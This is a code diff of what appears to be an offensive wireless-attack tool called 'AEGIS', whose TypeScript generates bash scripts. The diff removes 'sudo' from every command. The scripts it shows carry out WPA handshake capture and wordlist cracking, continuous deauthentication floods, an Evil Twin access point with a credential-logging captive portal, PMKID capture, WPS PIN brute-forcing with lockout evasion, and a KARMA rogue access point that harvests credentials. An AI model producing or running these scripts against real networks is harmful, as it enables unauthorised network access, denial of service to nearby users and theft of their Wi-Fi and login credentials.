@@ -52,7 +52,7 @@ function makeId() { return randomBytes(8).toString("hex"); }
 // ─── Tool detection ──────────────────────────────────────────────────────────
 
 const REQUIRED_TOOLS: Record<WirelessTechnique | "base", string[]> = {
-  base:       ["bash", "sudo"],
+  base:       ["bash"],
   scan:       ["airodump-ng", "airmon-ng"],
   handshake:  ["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng"],
   deauth:     ["airmon-ng", "aireplay-ng"],
@@ -102,19 +102,19 @@ function buildScript(cfg: WirelessConfig): string {
   if (cfg.technique === "scan") return `#!/bin/bash
 set -euo pipefail
 echo "[AEGIS] Starting wireless scan on ${iface} (channel ${channel || "all"})"
-sudo airmon-ng check kill 2>&1 || true
-sudo airmon-ng start ${iface} 2>&1
+airmon-ng check kill 2>&1 || true
+airmon-ng start ${iface} 2>&1
 echo "[AEGIS] Monitor interface: ${mon}"
-${channel ? `sudo iwconfig ${mon} channel ${channel} 2>&1 || true` : ""}
+${channel ? `iwconfig ${mon} channel ${channel} 2>&1 || true` : ""}
 echo "[AEGIS] Scanning for networks (${duration}s)..."
-timeout ${duration} sudo airodump-ng ${channel ? `-c ${channel}` : ""} --output-format csv -w /tmp/aegis_scan ${mon} 2>&1 || true
+timeout ${duration} airodump-ng ${channel ? `-c ${channel}` : ""} --output-format csv -w /tmp/aegis_scan ${mon} 2>&1 || true
 echo "[AEGIS] Parsing results..."
 if [ -f /tmp/aegis_scan-01.csv ]; then
   echo "=== DISCOVERED NETWORKS ==="
   cat /tmp/aegis_scan-01.csv | head -100
   rm -f /tmp/aegis_scan-01.csv /tmp/aegis_scan-01.kismet.csv 2>/dev/null || true
 fi
-sudo airmon-ng stop ${mon} 2>&1 || true
+airmon-ng stop ${mon} 2>&1 || true
 echo "[AEGIS] Scan complete"
 `;
 
@@ -122,15 +122,15 @@ echo "[AEGIS] Scan complete"
 set -euo pipefail
 echo "[AEGIS] WPA Handshake Capture | Target: ${bssid} | SSID: ${ssid}"
 CAPFILE="/tmp/aegis_hs_$(date +%s)"
-sudo airmon-ng check kill 2>&1 || true
-sudo airmon-ng start ${iface} 2>&1
+airmon-ng check kill 2>&1 || true
+airmon-ng start ${iface} 2>&1
 echo "[AEGIS] Monitor interface: ${mon} | Channel: ${channel}"
-sudo airodump-ng -c ${channel} --bssid ${bssid} -w "$CAPFILE" ${mon} &
+airodump-ng -c ${channel} --bssid ${bssid} -w "$CAPFILE" ${mon} &
 DUMP_PID=$!
 echo "[AEGIS] Capturing on channel ${channel} — waiting 5s then sending deauth..."
 sleep 5
 echo "[AEGIS] Sending deauth frames to ${client} @ ${bssid}..."
-sudo aireplay-ng --deauth 20 -a ${bssid} -c ${client} ${mon} 2>&1 || true
+aireplay-ng --deauth 20 -a ${bssid} -c ${client} ${mon} 2>&1 || true
 echo "[AEGIS] Waiting for 4-way handshake..."
 sleep 8
 kill $DUMP_PID 2>/dev/null || true
@@ -139,21 +139,21 @@ aircrack-ng "$CAPFILE"-01.cap 2>&1 | grep -A2 "handshake\\|WPA\\|BSSID" || echo 
 echo "[AEGIS] Starting crack with wordlist: ${wordlist}"
 aircrack-ng -w ${wordlist} -b ${bssid} "$CAPFILE"-01.cap 2>&1
 echo "[AEGIS] Capture file: $CAPFILE-01.cap"
-sudo airmon-ng stop ${mon} 2>&1 || true
+airmon-ng stop ${mon} 2>&1 || true
 `;
 
   if (cfg.technique === "deauth") return `#!/bin/bash
 set -euo pipefail
 echo "[AEGIS] Deauthentication Attack | AP: ${bssid} | Client: ${client} | Ch: ${channel}"
-sudo airmon-ng check kill 2>&1 || true
-sudo airmon-ng start ${iface} 2>&1
+airmon-ng check kill 2>&1 || true
+airmon-ng start ${iface} 2>&1
 echo "[AEGIS] Monitor interface: ${mon}"
-sudo iwconfig ${mon} channel ${channel} 2>&1 || true
+iwconfig ${mon} channel ${channel} 2>&1 || true
 echo "[AEGIS] Sending continuous deauth frames for ${duration}s..."
 echo "[AEGIS] Targeted client: ${client} (FF:FF:FF:FF:FF:FF = broadcast all clients)"
-timeout ${duration} sudo aireplay-ng --deauth 0 -a ${bssid} -c ${client} ${mon} 2>&1 || true
+timeout ${duration} aireplay-ng --deauth 0 -a ${bssid} -c ${client} ${mon} 2>&1 || true
 echo "[AEGIS] Deauth burst complete"
-sudo airmon-ng stop ${mon} 2>&1 || true
+airmon-ng stop ${mon} 2>&1 || true
 echo "[AEGIS] Done"
 `;
 
@@ -222,30 +222,30 @@ HTTPServer(('0.0.0.0', 80), Portal).serve_forever()
 PYEOF
 
 echo "[AEGIS] Starting monitor mode..."
-sudo airmon-ng check kill 2>&1 || true
-sudo airmon-ng start ${iface} 2>&1
-sudo iwconfig ${mon} channel ${channel} 2>&1 || true
+airmon-ng check kill 2>&1 || true
+airmon-ng start ${iface} 2>&1
+iwconfig ${mon} channel ${channel} 2>&1 || true
 
 echo "[AEGIS] Creating virtual interface at0..."
-sudo airbase-ng -e "${ssid}" -c ${channel} ${mon} &
+airbase-ng -e "${ssid}" -c ${channel} ${mon} &
 AIRBASE_PID=$!
 sleep 2
 
 echo "[AEGIS] Configuring at0 interface..."
-sudo ifconfig at0 192.168.1.1 netmask 255.255.255.0 up 2>&1 || true
-sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE 2>&1 || true
-echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward 2>/dev/null || true
+ifconfig at0 192.168.1.1 netmask 255.255.255.0 up 2>&1 || true
+iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE 2>&1 || true
+echo 1 | tee /proc/sys/net/ipv4/ip_forward 2>/dev/null || true
 
 echo "[AEGIS] Starting DHCP server..."
-sudo dnsmasq -C ${confDir}/dnsmasq.conf -d &
+dnsmasq -C ${confDir}/dnsmasq.conf -d &
 DNSMASQ_PID=$!
 
 echo "[AEGIS] Starting captive portal on port 80..."
-sudo python3 ${confDir}/portal.py &
+python3 ${confDir}/portal.py &
 PORTAL_PID=$!
 
 echo "[AEGIS] Deauthing clients from real AP ${bssid}..."
-sudo aireplay-ng --deauth 0 -a ${bssid} ${mon} &
+aireplay-ng --deauth 0 -a ${bssid} ${mon} &
 DEAUTH_PID=$!
 
 echo "[AEGIS] Evil Twin active — running for ${duration}s"
@@ -255,7 +255,7 @@ sleep ${duration}
 
 echo "[AEGIS] Stopping attack..."
 kill $DEAUTH_PID $PORTAL_PID $DNSMASQ_PID $AIRBASE_PID 2>/dev/null || true
-sudo airmon-ng stop ${mon} 2>&1 || true
+airmon-ng stop ${mon} 2>&1 || true
 echo ""
 echo "=== CAPTURED CREDENTIALS ==="
 cat ${confDir}/captured.log 2>/dev/null || echo "No credentials captured"
@@ -267,11 +267,11 @@ echo "[AEGIS] Done"
 set -euo pipefail
 echo "[AEGIS] PMKID Attack (clientless WPA2) | Target: ${bssid}"
 OUTFILE="/tmp/aegis_pmkid_$(date +%s)"
-sudo airmon-ng check kill 2>&1 || true
-sudo airmon-ng start ${iface} 2>&1
+airmon-ng check kill 2>&1 || true
+airmon-ng start ${iface} 2>&1
 echo "[AEGIS] Monitor interface: ${mon}"
 echo "[AEGIS] Capturing PMKID with hcxdumptool (${duration}s)..."
-sudo hcxdumptool -i ${mon} -o "$OUTFILE.pcapng" \\
+hcxdumptool -i ${mon} -o "$OUTFILE.pcapng" \\
   --enable_status=1 \\
   --filterlist_ap=${bssid} \\
   --filtermode=2 &
@@ -291,26 +291,26 @@ else
   echo "[AEGIS] No PMKID captured — AP may not support PMKID or target not in range"
   echo "[AEGIS] Tip: Try running longer or confirm target BSSID ${bssid} is correct"
 fi
-sudo airmon-ng stop ${mon} 2>&1 || true
+airmon-ng stop ${mon} 2>&1 || true
 echo "[AEGIS] Done"
 `;
 
   if (cfg.technique === "wps-pin") return `#!/bin/bash
 set -euo pipefail
 echo "[AEGIS] WPS PIN Attack (Pixie Dust + Brute Force) | Target: ${bssid} | Ch: ${channel}"
-sudo airmon-ng check kill 2>&1 || true
-sudo airmon-ng start ${iface} 2>&1
+airmon-ng check kill 2>&1 || true
+airmon-ng start ${iface} 2>&1
 echo "[AEGIS] Monitor interface: ${mon}"
 
 echo "[AEGIS] Step 1: Pixie Dust attack (fastest — recovers PIN from WPS exchange)..."
-timeout $((${duration}/2)) sudo reaver -i ${mon} -b ${bssid} -c ${channel} -vvv -K 1 -f 2>&1 || true
+timeout $((${duration}/2)) reaver -i ${mon} -b ${bssid} -c ${channel} -vvv -K 1 -f 2>&1 || true
 
 echo ""
 echo "[AEGIS] Step 2: WPS brute force PIN (if Pixie Dust failed)..."
 echo "[AEGIS] Note: Some APs have lockout — using -d 3 (3s delay) and -r 3:15 (lockout avoidance)"
-timeout $((${duration}/2)) sudo reaver -i ${mon} -b ${bssid} -c ${channel} -vvv -d 3 -r 3:15 2>&1 || true
+timeout $((${duration}/2)) reaver -i ${mon} -b ${bssid} -c ${channel} -vvv -d 3 -r 3:15 2>&1 || true
 
-sudo airmon-ng stop ${mon} 2>&1 || true
+airmon-ng stop ${mon} 2>&1 || true
 echo "[AEGIS] Done"
 `;
 
@@ -335,18 +335,18 @@ private_key_passwd=whatever
 wpe_logfile=$CONFDIR/karma_creds.log
 CONFEOF
 
-sudo airmon-ng check kill 2>&1 || true
-sudo airmon-ng start ${iface} 2>&1
+airmon-ng check kill 2>&1 || true
+airmon-ng start ${iface} 2>&1
 
 echo "[AEGIS] Creating at0 virtual interface..."
-sudo airbase-ng -P -C 30 -e "FreeWifi" ${mon} &
+airbase-ng -P -C 30 -e "FreeWifi" ${mon} &
 AIRBASE_PID=$!
 sleep 2
 
-sudo ifconfig at0 10.0.0.1 netmask 255.0.0.0 up 2>&1 || true
+ifconfig at0 10.0.0.1 netmask 255.0.0.0 up 2>&1 || true
 
 echo "[AEGIS] Starting hostapd-wpe with KARMA..."
-sudo hostapd-wpe $CONFDIR/karma.conf &
+hostapd-wpe $CONFDIR/karma.conf &
 HOSTAPD_PID=$!
 
 echo "[AEGIS] KARMA active — responding to all probe requests for ${duration}s"
@@ -359,7 +359,7 @@ sleep ${duration}
 
 echo "[AEGIS] Stopping KARMA..."
 kill $TAIL_PID $HOSTAPD_PID $AIRBASE_PID 2>/dev/null || true
-sudo airmon-ng stop ${mon} 2>&1 || true
+airmon-ng stop ${mon} 2>&1 || true
 echo ""
 echo "=== KARMA RESULTS ==="
 cat $CONFDIR/karma_creds.log 2>/dev/null || echo "No credentials captured"
